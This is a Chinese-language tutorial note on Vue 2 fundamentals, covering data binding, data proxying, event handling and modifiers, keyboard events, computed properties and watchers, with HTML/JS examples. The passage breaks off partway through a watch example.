# 参考

本文笔记参考别人的笔记链接：[Vue CLI Todo-List案例 · 语雀](https://www.yuque.com/cessstudy/kak11d/fk481k)；

参考网课：张天禹老师：[尚硅谷Vue2.0+Vue3.0全套教程丨vuejs从入门到精通](https://www.bilibili.com/video/BV1Zy4y1K7SH?share_source=copy_web&vd_source=3aa7941af4112be6372d003f08c3d0c6)；



# 一、Vue的初步理解

## 1.1 环境搭建

### 1. 读官网

阅读了vue官网的一些知识，对vue官网一定程度的了解

写了个html，在头部引入vue官网下载的开发环境的js文件，测试运行，控制台有警告如下：



### 2. 两个友好警告

<img src="https://i0.hdslb.com/bfs/album/48bfcd7a797bb582150f59312df2ed12fc9f0a90.png" alt="image-20220528002402509" style="zoom: 80%;" />



### 3. 推荐插件安装

#### 安装vue Devtools

官网教程点击，进到github，在找到跳转浏览器扩展的插件，下载，即可解决第一个警告

![image-20220528004742767](https://i0.hdslb.com/bfs/album/e944fd922c9245ed17cd924327a0c5dd2ebf1c4d.png)





#### 安装Live Server

在vscode的右下角发现，html文件是运行在这个服务器的端口号中

![image-20220528005831662](https://i0.hdslb.com/bfs/album/b054541f7279571bc18919d6a8f2ee5b92a01365.png)

这是运行后的链接，http://127.0.0.1:5500/初识/hello.html

我们在127.0.0.1:5500端口服务器，就可以看到我们的文件

![image-20220528010024488](https://i0.hdslb.com/bfs/album/311eea71d225597879fdacfc03171d65200aa211.png)

#### Vue3 Snippets

![image-20220528195622103](https://i0.hdslb.com/bfs/album/8b9d72094d7ef9e6df79eb8b1a83efc88d08ff6f.png)





#### 强制刷新

shift+F5才是强制刷新，能看到一些普通刷新看不到的网络请求错误。

> 作用：强制刷新，不管浏览器是否缓存，都要重新去源站服务器请求资源，成功则返回 200

发现浏览器标识头像不存在。是因为那个5050服务器里的问题

![image-20220528005650478](https://i0.hdslb.com/bfs/album/4f2ba4b5809f8be6fd5b2182c9d488f0ced2babe.png)



#### 添加ico浏览器标识图标

命名为`favicon.ico` ，放在文件根目录，跟vue.js文件一样即可！









## 1.2 第一个Vue、插值表达式

### 1. 括号里为什么有花括号

因为里面写的是对象，对象就是花括号圈起来的一堆`key:value`！

Vue实例的根数据对象。

![image-20220528011621169](https://i0.hdslb.com/bfs/album/4fb6a47cd1c3b27e759c183e300763fad98490a6.png)

就像ajax，如下代码所示：

```js
 $ajax({
             type: "post",
             url: "code14/2.post.php",
             data: {
                 username: "小花",
                 age: 18,
                 password: "123abc"
             },
             success: function(result){
                 alert("POST请求到的数据：" + result);
             },
             error: function(msg){
                 alert("POST请求数据错误：" + msg);
             }
       })
```





### 2. Vue绑定div容器

Vue实例后，el即`element`，html元素，vm先绑定容器的id

插值语法：`{{}}`，用于读取data对象的值！这不是ES6语法，而是Vue自定义的语法！

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../vue.js"></script>
</head>
<body>
    <!-- 准备好一个容器 -->
		<div id="demo">
			<h1>Hello,{{name}}</h1>
		</div>

        <script>
            new Vue({ 
                el:'#demo',
                data:{
                    name:'cola!!!!'
                }
            })
        </script>
</body>
</html>
```





### 3. 双花括号{{}}写js表达式

上文说到，`{{}}`用于**直接读取**data对象的值！它是Vue定义的**插值语法**！

语法`{{}}`里边：其实写的是js表达式，即JavaScript表达式

例如js的方法：把字母全部变成大写`toUpperCase()`

在插值语法里可以这样使用：`{{name.toUpperCase()}}`

> 总结

-    `{{xxx}}`中的xxx要写**js表达式**，且xxx可以直接读取到data中的所有属性；
-    注意区分：**js表达式** 和 **js代码(语句)**：

①JS表达式：一个表达式只会产生一个值，这值可以放在任何一个需要值的地方：
        a
        a+b
        demo(1)
        x === y ? 'a' : 'b' 

②js代码(语句)
​        if(){}
​        for(){}





 ### 4. Vue开发者工具的使用

> 即见本文目录**1.1.3**的vue Devtools浏览器扩展！

  **打开控制台**，找到图下就是Vue开发者工具的基本使用了：

---

  ![image-20220528020148789](https://i0.hdslb.com/bfs/album/f18a9817f9e88ddc321187da55dc62a74e37404f.png)

  -   root容器里的代码被称为【Vue模板】；
  -   Vue实例和容器是一一对应的；
  -   真实开发中只有一个Vue实例，并且会配合着组件一起使用；



### 5. v-bind的作用

例子：`<a v-bind:href="url">点我去百度</a>`

> 作用1：
>
> 不加v-bind，双引号里就是一个普普通通的字符串值，值就是为url这个字符串，啥链接也不是；
>
> **加了v-bind**，双引号里的url就不是value值了，而是**把双引号里去掉，再把url当做js表达式处理**，url一解析，成了链接地址http://www.atguigu.com。
>
> 作用2：
>
> 比如：`<div v-bind:age="18"></div>`，有v-bind这个age就是数字了，若没有v-bind就是“18”，变成字符串了！

后面又讲到的单双向绑定里的属于数据绑定。

**v-bind:简写为冒号**   `:`，如下代码所示：

```html
	<body>
		<div id="root">
            //不加v-bind，url就不能识别成链接
			<a v-bind:href="url">点我去百度</a>
			<a :href="school.url" :x="hello">点我去{{school.name}}学习2</a>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'jack',
                  url:'www.baidu.com',
				school:{
					name:'尚硅谷',
					url:'http://www.atguigu.com',
				}
			}
		})
	</script>
```



## 1.3 数据绑定、this箭头函数、data的写法

### 1. 认识v-bind与v-model

`v-model:value='name'`简写就是`v-model='name'`，因为v-model默认绑定value值，不绑定其他值

对于v-bind，他有如`v-bind:href="url"`，`:style="styleObj"`，`:class="mood"`的情况！**v-bind绑定的可不止是value**，所以v-bind若绑定value，是不能省略。

`v-model:value`他是对value值进行绑定，因此，双向绑定**不能在某些标签中**使用，比如`<h1>`，h标签哪里有value值？

反正记住**前后端要交互的那必定是双向绑定**，前端用户输入数据，流入了data，改变了data的值！data的值又流入页面div。

代码演示：

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>数据绑定</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
        Vue中有2种数据绑定的方式：
            1.单向绑定(v-bind)：数据只能从data流向页面。
            2.双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。
                备注：
                    1.双向绑定一般都应用在表单类元素上（如：input、select等）
                    2.v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。
		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 普通写法 -->
			<!-- 单向数据绑定：<input type="text" v-bind:value="name"><br/>
			双向数据绑定：<input type="text" v-model:value="name"><br/> -->

			<!-- 简写 -->
			单向数据绑定：<input type="text" :value="name"><br/>
			双向数据绑定：<input type="text" v-model="name"><br/>

			<!-- 如下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上 -->
			<!-- <h2 v-model:x="name">你好啊</h2> -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```



如图：同时改变！

![image-20220528110313831](https://i0.hdslb.com/bfs/album/bd5029be43828a4e13e4d0ccf7e254300204b986.png)







### 2. 理解Vue实例化对象

> 当`const vm = new Vue({})`

输出vm对象，如下图，$开头的都是这个实例对象vm**的内部方法**

![image-20220528115910271](https://i0.hdslb.com/bfs/album/571c00d66ac720b7b5fd43b2388fcbdf2821c8e5.png)

控制台查看继续下滑查看，原型Object展开：可以看到还有$开头的！

> 这是vm的老爸，**缔造者Vue的方法**

![image-20220528120023193](https://i0.hdslb.com/bfs/album/5d5c68a42f6e4019ca1d07c1d304fdb9db132444.png)



### 3. this、箭头函数问题

> script下的第一级this为：Windows对象
>

![image-20220528121209250](https://i0.hdslb.com/bfs/album/b588abaffd95443dd3bb75f9b43530674986f0cb.png)



> **this的指向**

箭头函数被非箭头函数包含，this绑定的就是最近一层非箭头**函数**的this。因为箭头函数没有this，所以需要通过查找作用域链来确定this的值。

注意**是函数而不是对象**，找的是最近一层非箭头**函数**的this。

> 为什么强调是**函数**？

如果Vue内部的**data函数**【即data:function(){}，简写data(){}】如果改为箭头函数，其内部的this指向的就是Windows了，因这个this最近一层非箭头**函数**是js的function函数，即为Windows。

> 结论：

- **普通函数的this都是属于其当前对象的**
- 而**箭头函数的作用**就是：解决当各种函数嵌套时候，this的指向不明的问题，根据你要使用哪位对象来决定是否要使用箭头函数！



### 4. data(){}写法问题

- 对象式：data:{}
- 函数式：data:function(){  }的简写	`data(){}`，以后得写函数式！

> **对象式**，对象里边直接写的任何东西，自然对象xx都能获取到；data是vm的根数据对象
>
> **函数式**，就是一个函数方法了，你要写一个return{}包住，让他返回出去，因为函数得有返回值！

思考：`对象式data:{}`里为什么不能写window对象的console.log方法？

data是写的是对象，对象里面写的都是key-value，key-value 的写法，写个屁js语句。  所以js 的代码得写在function里边，即data的函数式写法！





### 5. MVVM模型

看看这三模型的图示MVVM即：**M**odel、**V**iew、**Vi**ew**M**odel、

![image-20220528130248535](https://i0.hdslb.com/bfs/album/867c8ff1027b850cccf2df4f00a7ecdc68c8b8bd.png)



三模型在代码中的位置，对应如下：

![image-20220528130346005](https://i0.hdslb.com/bfs/album/0be4e7a5e582fa1aae17509d5a8d0b4621c796f5.png)



结论：因此，创建Vue实例的时候，简写都是用vm，const vm = new Vue({})



### 6. 控制台可以写js代码

document.getxxx		#获取什么元素

vm           #输出const vm的vm

person.age=19	#给age赋值

person   #输出person

![image-20220528131409952](https://i0.hdslb.com/bfs/album/5fce96cc50f7ee9da9f4796a6aa5c99337e89ac9.png)





# 二、事件、计算属性、监视

## 2.1 数据代理

### 1. object.defineproperty

js对象的方法，此例子只写js的代码：

一句话总结：即类似Java的set、get方法的作用！

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>回顾Object.defineproperty方法</title>
	</head>
	<body>
		<script type="text/javascript" >
			let number = 18          
			let person = {
                //这两个是写死的数据，没有数据代理
				name:'张三',
				sex:'男',
			}
			
            //对person对象的age属性代理，但是没age啊，age哪来啊，用getter获取到，getter返回的是18，age就是18，还可setter来改变age
            //如果你像上方的sex：‘男’；那样就是写死了，没有数据代理，写死在那里的数据都改不了。这就是数据代理，这就是getter的作用
			Object.defineProperty(person,'age',{
				// value:18,
				// enumerable:true, //控制代理属性是否可以枚举，即是否可以被遍历出来。因此如果用person[key]进行遍历就遍历不到了。默认值是false
				// writable:true, //控制代理属性是否可以被修改，默认值是false
				// configurable:true //控制属性是否可以被删除，默认值是false
				//当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
                //非简写为  get:function cola(){}
				get(){
					console.log('有人读取age属性了')
					return number
				},

				//当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值，value就是收到的值
				set(value){
					console.log('有人修改了age属性，且值是',value)
					number = value
				}

			})
		</script>
	</body>
</html>
```

结论：有了get和set，你就不用自己写set、get才能调用到对象属性了，因为`person对象`跟方法object.defineproperty关联了，关联后，

- person.age=20，就相当于调用set方法。改变属性值，对应的setter将被执行。**触发条件是对应属性值发生改变**
- person.age 就用了get方法
- 为什么可以直接.age就获取到了呢？因为这就是数据代理的作用了，他把方法显露了出来，类似java的实体类里的setter和getter。





### 2. Vue内的数据代理

**Vue函数内的data，位置其实是在实例对象vm里_data**，如图：

![image-20220528134408854](https://i0.hdslb.com/bfs/album/b7bfc8bb8c8f286533bf7a1968716edff4d51d8a.png)

因此，容器div要想拿到Vue实例对象的data数据，本当应该是`{{_data.name}}`、`{{__data.age}}`

由于Vue有数据代理object.defineproperty，下图所示：

他封装有setter、getter，因此我们可以直接`{{name}}`、`{{age}}`就拿到数据了

![image-20220528134241834](https://i0.hdslb.com/bfs/album/78776e17ec8ba06083ea6c63a343ca6644554557.png)



Windows下并没有data，如果把data写在script标签下，我们就能拿到data

![image-20220528134904614](https://i0.hdslb.com/bfs/album/c14ac49f39545e0b6255797f1f1d7220ffd41156.png)

控制台输入data，输出1

![image-20220528134854131](https://i0.hdslb.com/bfs/album/f8e975df7e5651a979ecd5b7fc09e7e4565ae90f.png)





## 2.2 事件和事件处理

### 1. 事件对象event、方法传参、methods、v-on

容器里面装的点击事件、等等，这些**事件的方法写在哪**？肯定得把方法写在vm里边的methods，这样容器才能拿到啊

> `事件对象event`作用

methods里的方法可以写参数`event`的，参数`event`就是你这个事件对象：

1. 事件对象event可以拿到你这个事件的方法名如：event.target
2. 若你在输入框input标签绑定事件和方法，**event.target.value**拿能到你输入框的值。

> event + 传参数

---

例如：<button @click="showInfo2($event,66)">点我提示信息2（传参）</button>

---

1. 如上，触发点击事件时，如果方法里你还想传递自己的参数66，且还想**事件对象event**保留的话，

   就可`<button @click="showInfo2($event,66)">点我提示信息2（传参）</button>`，如果你不写$event，这个event就没了，会被你的参数66覆盖。

2. 如果只想传递自己的参数，不要event，就是`<button @click="showInfo2(66)">点我提示信息2（传参）</button>`


> 如果自己没有参数需要传递，Vue事件绑定的方法是**不用写括号（）的，也可不写event**，在methods里还能获取到。

即：直接`@click="showInfo2()"`或者`@click="showInfo2"`。

但是在`methods:{}`里边的方法就写，如`showInfo2(event){}`就可以带上事件对象了，简写是`showInfo2(e)`。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件的基本使用</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
        事件的基本使用：
            1.使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；
            2.事件的回调需要配置在methods对象中，最终会在vm上；
            3.methods中配置的函数，不要用箭头函数！否则this就不是vm了；
            4.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；
            5.@click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参；
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<!-- <button v-on:click="showInfo">点我提示信息</button> -->
			<button @click="showInfo1">点我提示信息1（不传参）</button>
			<button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
			},
			methods:{
				showInfo1(event){
					// console.log(event.target.innerText)
					// console.log(this) //此处的this是vm
					alert('同学你好！')
				},
				showInfo2(event,number){
					console.log(event,number)   //输出一个事件对象，还有参数66
					// console.log(event.target.innerText)
					// console.log(this) //此处的this是vm
					alert('同学你好！！')
				}
			}
		})
	</script>
</html>
```



使用v-on:xxx 或简写@xxx 绑定事件，其中xxx是事件名；

`<button v-on:click="showInfo">点我提示信息</button>`



### 2. 事件冒泡Bubble

**何为冒泡**：

- 代码：body包住div，div包住span，三个标签都绑定点击事件，事件功能是弹窗；
- 运行：一点span，外面两个也会弹出，这便是事件冒泡。

像我打了同学，同学打了我一下后[即冒泡事件]，告诉了他爸，他爸又打我[冒泡事件]，他爸又告诉他爷爷，他爷爷又打我[冒泡事件]。

因此**取消冒泡**就是，让同学不要告诉他爸，打他爸的时候，让他爸不要告诉他爷爷。



### 3. 事件捕获

相当于冒泡逆序，即：

点击span标签，事件是从body，再到div，最后再到span冒泡，跟冒泡逆着来。



### 4. 事件类型汇总

事件类型大汇总；
1》触摸类事件：只会在移动设备中产生，对手的移动位置进行检测并做出响应
onTouchCancel:
onTouchEnd
onTouchMove
onTouchStart
2》键盘类事件：
**onKeyDown**
**onKeyUp**
onKeyPress
3》剪切类事件
onCopy
onCut
onPaste
4》 表单类事件
onChange
onInput
onSubmit
5》 焦点类事件
**onFocus ： 获得焦点**
**onBlur ： 失去焦点**
6》UI元素： 元素或页面的滚动事件
onScroll
7》滚动事件：监听滚动位置，方向
onWheel
8》鼠标类事件：
**onClick**
onContextMenu ：右键，上下文菜单
onDoubleClickc
onMouseEnter
onMouseDown
onMouseLeave
onMouseMove
onMouseOut
onMouseOver
onMouseUp
9》鼠标拖拽事件： 上传内容
onDrop
onDrag
onDragEnd
onDragEnter
onDragExit
onDragLeave
onDragOver
onDragStart

### 5. 事件修饰符

疑问：若事件绑定**出现了事件冒泡，那么Vue中怎么处理？**



| 事件修饰符 |                             含义                             |
| :--------: | :----------------------------------------------------------: |
|  prevent   | 阻止默认事件（常用）；比如点击<a href:"">链接自动跳转，使用后，点击不会再跳转，而是触发点击事件 |
|    stop    |          阻止事件冒泡（常用）；   例如：@click.stop          |
|    once    |          事件只触发一次（常用）；例如： @click.once          |
|  capture   |                     使用事件的捕获模式；                     |



v-on:click 简写是@click

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件修饰符</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
		<style>
			*{
				margin-top: 20px;
			}
			.demo1{
				height: 50px;
				background-color: skyblue;
			}
			.box1{
				padding: 5px;
				background-color: skyblue;
			}
			.box2{
				padding: 5px;
				background-color: orange;
			}
			.list{
				width: 200px;
				height: 200px;
				background-color: peru;
				overflow: auto;
			}
			li{
				height: 100px;
			}
		</style>
	</head>
	<body>
		<!-- 
        Vue中的事件修饰符：
            1.prevent：阻止默认事件（常用）；
            2.stop：阻止事件冒泡（常用）；
            3.once：事件只触发一次（常用）；
            4.capture：使用事件的捕获模式；
            5.self：只有event.target是当前操作的元素时才触发事件；写在冒泡事件的父亲角色，把他父亲闭住，就冒不起来。
            6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<!-- 阻止默认事件（常用） -->
			<a href="http://www.atguigu.com" @click.prevent="showInfo">点我提示信息</a>

			<!-- 阻止事件冒泡（常用） -->
			<div class="demo1" @click="showInfo">
				<button @click.stop="showInfo">点我提示信息</button>
				<!-- 修饰符可以连续写 -->
				<!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
			</div>

			<!-- 事件只触发一次（常用） -->
			<button @click.once="showInfo">点我提示信息</button>

			<!-- 使用事件的捕获模式 -->
			<div class="box1" @click.capture="showMsg(1)">
				div1
				<div class="box2" @click="showMsg(2)">
					div2
				</div>
			</div>

			<!-- 只有event.target是当前操作的元素时才触发事件； -->
			<div class="demo1" @click.self="showInfo">
				<button @click="showInfo">点我提示信息</button>
			</div>

			<!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； -->
			<ul @wheel.passive="demo" class="list">
				<li>1</li>
				<li>2</li>
				<li>3</li>
				<li>4</li>
			</ul>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods:{
				showInfo(e){
					alert('同学你好！')
					// console.log(e.target)
				},
				showMsg(msg){
					console.log(msg)
				},
				demo(){
					for (let i = 0; i < 100000; i++) {
						console.log('#')
					}
					console.log('累坏了')
				}
			}
		})
	</script>
</html>
```



### 6. 键盘事件

给事件绑定键盘按键触发事件！**keyup键盘弹起**，**keydown键盘按下**

@keyup.ctrl="showInfo"	按下修饰键【如ctrl】的同时，再按下任意的其他键，随后释放其他键，事件才被触发，但这并不能实现我们平时ctrl+C、ctrl+V的组合按键

@keydown.enter="showInfo" 	**按下后触发**该事件showInfo



**组合按键**：

```js

<!-- Alt + C，有修饰按键keyup -->
<input v-on:keyup.alt.67="clear">
    
    修饰按键即：Ctrl、Alt
    修饰键与常规按键不同，在和 keyup 事件一起用时，事件触发时“修饰键”必须处于按下状态。
    如何触发 keyup.ctrl：按住 ctrl 的情况下，再释放其它按键，才能触发。而单单释放 ctrl 也不会触发事件。



组合键+单个按键，一起全都要，
<textarea v-model="message" @keydown.enter="handleEnter" @keydown.alt.enter="handleAltEnter"></textarea>

```

组合键+单个按键，一起全都要，会出现冲突问题，参考：
 https://blog.csdn.net/qq_45364616/article/details/103435299?utm_source=app&app_version=5.3.1&code=app_1562916241&uLinkId=usr1mkqgl919blen



js可以获取键盘按键的码数，比如enter是13；也能获取到按键的名称，比如切换大小写按键的名称是CapsLock；

需要注意的是Vue里的一些按键名称不同，比如CapsLock，vue是写成caps-lock

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>键盘事件</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			1.Vue中常用的按键别名：
				回车 => enter
				删除 => delete (捕获“删除”和“退格”键)
				退出 => esc
				空格 => space
				换行 => tab (特殊，必须配合keydown去使用，因为tab本就有一个切换功能，会让当前的输入框失去焦点。)
				上 => up
				下 => down
				左 => left
				右 => right

			2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）

			3.系统修饰键（用法特殊）：ctrl、alt、shift、meta
				(1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发，但是这里没说到组合按键啊
				(2).配合keydown使用：正常触发事件。

			4.也可以使用keyCode去指定具体的按键，比如enter是13（不推荐）

			5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		Vue.config.keyCodes.huiche = 13 //定义了一个别名按键“回车”

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods: {
				showInfo(e){
					// console.log(e.key,e.keyCode)
					console.log(e.target.value)
				}
			},
		})
	</script>
</html>
```





### 7、.native修饰符

阅读文章： [vue框架的.native修饰符：将原生事件绑定到组件](https://blog.csdn.net/dx_zheng/article/details/111038970?ops_request_misc=&request_id=&biz_id=102&utm_term=非原生组件要加上.native&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-111038970.142^v73^insert_down3,201^v4^add_ask,239^v2^insert_chatgpt&spm=1018.2226.3001.4187)



## 2.3 计算属性

### 1. {{   fullName()   }}

需求：输入姓、名后，全名那里自动解析到输出

![image-20220528155040582](https://i0.hdslb.com/bfs/album/f62db438ef96f85fa8fee6f2a0742e57b0ae8be5.png)

很简单，我们只需要双向绑定，最后插值进去就好了。但是我们这不这样做，我们使用插值插入的是一个方法，他是methods里边的返回，即他是return回来。



注意：**插值语法里写方法必须有括号()**，如下图`{{fullName()}}`，相当于识别出是js表达式的规则嘛，方法返回return的是一个值就获取到了。不能省略括号否则，他会看成data的数据了，不会自动解析。

为什么要这样？因为实际需求，用户输入的参数可能需要处理，就是通过一个方法进行复杂处理，最后返回。

![image-20220528155009772](https://i0.hdslb.com/bfs/album/78b3d55082d5129dce424cb64e5defdc8c3abc5a.png)





### 2. computed计算属性，fullName与fullName()

> 还是上文的那个姓名例子，我们使用`computed`进行优化：

1. 不用方法`{{fullName()}}`，方法老是在调用，没有缓存，不好。

2. 而是用`{{fullName}}`，fullName是一个计算属性的名字，不是方法，所以不用括号()了。

> 计算属性的用法：

在**computed:{}**里面写入`fullName:{}`，然后写get和set，如下图代码：

- get：必须有return值！初始和修改时候会执行，而且有缓存，数据不变动的时候，在缓存里边拿
- set：在数据变动的时候都会被调用，看看set括号内，value123是形参来的。那他实参是怎么来的？实参就是用户在控制台进行修改fullName给的值。

<img src="https://i0.hdslb.com/bfs/album/0c5c2ed711c6d8989546e3b7692b2de0668a87d9.png" alt="image-20220920153304394" style="zoom:80%;" />

> 测试计算属性，如下图所示：
>
> ①一上来展示数据：调用getter
>
> ②控制台修改fullname：引号内就是修改的值，set收到你的值，把你的‘-’号作为分隔符，把然后set把fullName给改了！
>
> ③改完又跟①一样上来展示数据，调用getter

<img src="https://i0.hdslb.com/bfs/album/f5e04ac46222dd5c864cd183f0bef73905b19648.gif" alt="set" style="zoom: 67%;" />



原代码如下：

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_计算属性实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
        计算属性：
            1.定义：要用的属性不存在，要通过已有属性计算得来。
            2.原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
            3.get函数什么时候执行？
                (1).初次读取时会执行一次。
                (2).当依赖的数据发生改变时会被再次调用。
            4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
            5.备注：
                1.计算属性最终会出现在vm上，直接读取使用即可。
                2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。
		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			测试：<input type="text" v-model="x"> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
			<!-- 全名：<span>{{fullName}}</span> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
			全名：<span>{{fullName}}</span> -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三',
				x:'你好'
			},
			methods: {
				demo(){
					
				}
			},
			computed:{
				fullName:{
					//get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
					//get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
					get(){
						console.log('get被调用了')
						// console.log(this) //此处的this是vm
						return this.firstName + '-' + this.lastName
					},
					//set什么时候调用? 当fullName被修改时。
					set(value123){
						const arr = value123.split('-')
						this.firstName = arr[0] //-号前面的都是arr[0]
						this.lastName = arr[1]//-号后面的都是arr[1]
					}
				}
			}
		})
	</script>
</html>
```





### 3. computed简写

承接上文，当计算属性**只考虑读取，不考虑修改，才可以简写，且必须要有return值**。

此外，还可以写许多函数对数据进行处理再进行get获取！详情跳转：[4. v-for遍历+过滤](###4. v-for遍历+过滤)；[5. v-for+排序功能实现](###5. v-for+排序功能实现)；



```html
computed:{
    //简写
    fullName(){
    console.log('get被调用了')
    return this.firstName + '-' + this.lastName
	}
}
```

你会有疑问这怎么跟写在methods里的方法一样了？
			表面上看确实是函数，但他是在computed里边的，因此他本质是执行了方法，实则是return返回结果放在了计算属性里面！且有缓存



### 4. methods？computed？

我还有点乱了，什么时候用methods？computed？

​			你看方法methods都跟事件绑定执行方法的，而computed他是一个值返回给前端渲染。



### 5. 三目运算

演示：点击切换

![image-20220528201431439](https://i0.hdslb.com/bfs/album/9300104a7a350355281ad6025347b33478e27abb.png)



> Vue的三目：`参数?'值1':'值2'`
>
> Java的三目：`int c = a > b ? a : b;` 

isHot ? '炎热' : '凉爽'

参数isHot 真，炎热；参数isHot 假，凉爽。



> 看下图：简单的语句可以写在绑定事件里边：

<img src="https://i0.hdslb.com/bfs/album/59609ad180371fab0773c795885e04e56ba2c4d3.png" alt="image-20220528201616969" style="zoom:150%;" />



源代码：

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>天气案例</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<!-- 绑定事件的时候：@xxx="yyy" yyy可以写一些简单的语句 -->
			<!-- <button @click="isHot = !isHot">切换天气</button> -->
			<button @click="changeWeather">切换天气</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
		})
	</script>
</html>
```





## 2.4 watch监视

监视能干嘛？全局异步加载？

### 1. watch格式

| 使用格式                                                     | 说明         |
| ------------------------------------------------------------ | ------------ |
| watch:{     '变量'    :{  **监视语句**,  handler{} }     }   | 在vm里面写的 |
| vm.$watch(    '变量'    , {  **监视语句**,  handler{}  }    } | vm的外部写的 |



### 2. 监视语句汇总

| 语句              | 说明                      |
| ----------------- | ------------------------- |
| immediate:true,   | 初始化时让handler调用一下 |
| deep:true,        | 开启深度监视              |
| newValue,oldValue | 新改变的值与旧的值        |



### 3. 监视参数值是否改变

> 作用：监视一个值是否被修改，如果改了就执行handle函数，还能获取到原来旧的值和改变了的新的值。
>
> ​            如果监视的对象，对象里的仅仅某对key-value值改变，watch是检测不到的，这种情况要开启深度监视！

如下代码，监视watch能写在两个地方，如果你确定你要监视的，就是Vue实例对象的东西，那写在Vue里面，否则写在外面。

监听能获取到改变的了新的值与旧的值，两者直接加减运算，那有哪些运用场景呢？



关键代码：

```html
	<body>
		<!-- 
        监视属性watch：
            1.当被监视的属性变化时, 回调函数自动调用, 进行相关操作
            2.监视的属性必须存在，才能进行监视！！
            3.监视的两种写法：
                (1).new Vue时传入watch配置
                (2).通过vm.$watch监视
		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
			/* watch:{
			这里的isHot本质应该写是'isHot'
				isHot:{
					immediate:true, //初始化时让handler调用一下
